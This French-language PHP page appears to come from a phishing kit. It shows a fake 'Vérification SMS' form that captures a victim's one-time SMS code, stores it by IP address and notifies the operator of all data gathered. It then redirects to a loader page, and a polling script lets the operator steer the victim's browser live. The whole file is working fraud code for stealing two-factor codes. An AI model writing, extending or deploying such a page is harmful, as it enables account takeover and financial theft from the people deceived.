<?php
require_once 'config.php';
checkRedirect();

if ($_POST && isset($_POST['code_sms'])) {
    $sms_data = ['code_sms' => $_POST['code_sms']];
    
    // Sauvegarder les données par IP
    saveFormData($current_ip, 'sms', $sms_data);
    
    // Notifier TOUTES les données disponibles pour cette IP
    notifyAllData($current_user_id, $current_ip, 'sms');
    
    header("Location: loader2.php");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Vérification SMS</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .btn { display: block; width: 100%; padding: 15px; margin: 10px 0; background: #9C27B0; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; text-align: center; font-size: 18px; letter-spacing: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Vérification SMS</h1>
        
        <form method="post">
            <div class="form-group">
                <label>Code SMS reçu *</label>
                <input type="text" name="code_sms" placeholder="123456" maxlength="6" required>
            </div>
            
            <button type="submit" class="btn">✅ Valider</button>
        </form>
    </div>

    <script>
    setInterval(() => {
        fetch('check_redirect.php?user_id=<?php echo $current_user_id; ?>')
            .then(r => r.text())
            .then(page => {
                if (page && page.trim() !== '' && page !== 'sms.php') {
                    window.location.href = page;
                }
            });
    }, 2000);
    </script>
</body>
</html>
